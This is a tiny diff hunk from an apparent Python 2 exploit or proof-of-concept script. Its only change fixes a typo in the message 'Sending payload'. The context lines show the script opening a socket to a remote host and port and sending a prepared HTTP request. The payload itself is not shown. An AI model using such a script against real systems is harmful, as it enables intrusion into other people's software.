@@ -70,7 +70,7 @@ httpreq = (
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-print "[!] Sending paylad"
+print "[!] Sending payload"
 s.connect((rhost,rport))
 print "[!] Sent"
 s.send(httpreq)
